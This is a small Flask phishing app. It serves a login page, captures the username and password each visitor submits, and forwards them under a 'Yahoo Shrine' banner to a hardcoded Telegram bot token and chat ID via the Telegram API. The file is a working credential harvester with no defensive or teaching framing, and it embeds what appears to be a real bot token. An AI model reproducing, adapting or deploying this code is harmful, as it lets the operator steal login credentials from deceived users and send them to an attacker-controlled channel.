from flask import Flask, request, render_template
import requests

app = Flask(__name__)

TOKEN = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"
CHAT_ID = "1559369377"

@app.route('/')
def home():
    return render_template("index.html")

@app.route('/send', methods=["POST"])
def send():
    username = request.form["username"]
    password = request.form["password"]

    log = f"🔥 Yahoo Shrine 🔥\nUsername: {username}\nPassword: {password}"

    # Send to Telegram
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={log}"
    requests.get(url)

    return "Ogun Tracker Activated ✅"

if __name__ == "__main__":
    app.run(debug=True)
